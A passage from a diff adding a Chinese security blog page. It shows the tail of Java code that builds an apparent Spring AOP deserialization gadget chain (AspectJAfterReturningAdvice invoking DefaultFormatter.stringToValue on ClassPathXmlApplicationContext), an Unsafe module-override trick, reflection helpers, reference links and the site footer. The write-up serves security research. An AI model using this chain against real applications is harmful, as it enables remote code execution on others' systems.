+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">AspectJAfterReturningAdvice</span><span class="w"> </span><span class="nf">getAspectJAfterReturningAdvice</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Method mapGetMethod = Map.class.getMethod(&#34;get&#34;, Object.class);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">////        pointcut.setExpression(&#34;.*get&#34;);  // 匹配 Map.get()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Map&lt;String, String&gt; targetMap = new HashMap&lt;&gt;();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(targetMap);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                mapGetMethod, pointcut, aif</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        );</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        return advice;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DefaultFormatter</span><span class="w"> </span><span class="n">defaultFormatter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultFormatter</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">defaultFormatter</span><span class="p">.</span><span class="na">setValueClass</span><span class="p">(</span><span class="n">ClassPathXmlApplicationContext</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">mapGetMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DefaultFormatter</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;stringToValue&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJExpressionPointcut</span><span class="w"> </span><span class="n">pointcut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AspectJExpressionPointcut</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pointcut</span><span class="p">.</span><span class="na">setExpression</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SingletonAspectInstanceFactory</span><span class="w"> </span><span class="n">aif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SingletonAspectInstanceFactory</span><span class="p">(</span><span class="n">defaultFormatter</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJAfterReturningAdvice</span><span class="w"> </span><span class="n">advice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AspectJAfterReturningAdvice</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">mapGetMethod</span><span class="p">,</span><span class="w"> </span><span class="n">pointcut</span><span class="p">,</span><span class="w"> </span><span class="n">aif</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">advice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Constructor&lt;ClassPathXmlApplicationContext&gt; declaredConstructor = ClassPathXmlApplicationContext.class.getDeclaredConstructor(String.class);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Object o = newInstanceWithoutConstructor(TypeFactory.class);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        TypeResolutionContext ctxt = new TypeResolutionContext.Empty((TypeFactory) o);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        // 3. 创建 AnnotationMap（存储注解信息，这里用空的）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AnnotationMap classAnn = new AnnotationMap();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AnnotationMap[] paramAnn = new AnnotationMap[0]; // 无参数时用空数组</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        // 4. 初始化 AnnotatedConstructor 对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AnnotatedConstructor annotatedConstructor = new AnnotatedConstructor(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                ctxt, declaredConstructor, classAnn, paramAnn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        );</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Method mapGetMethod = annotatedConstructor.getClass().getMethod(&#34;call1&#34;, Object.class);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        pointcut.setExpression(&#34;&#34;);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(annotatedConstructor);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                mapGetMethod, pointcut, aif</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        );</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        return advice;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">filedName</span><span class="p">,</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getField</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">(),</span><span class="n">filedName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="n">value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Field</span><span class="w"> </span><span class="nf">getField</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="o">[]</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredFields</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="p">(</span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="p">:</span><span class="n">fields</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">field</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">fieldName</span><span class="p">)){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="n">field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getSuperclass</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>参考</p>
+<blockquote>
+<p><a href="https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=4848214582444528&group_id=15522421588412">https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=4848214582444528&group_id=15522421588412</a></p>
+<p><a href="https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ">https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/%E5%8E%9F%E7%94%9Fjdk/java-file%E5%8D%8F%E8%AE%AE-%E7%AE%80%E6%9E%90/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>java file协议 简析</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
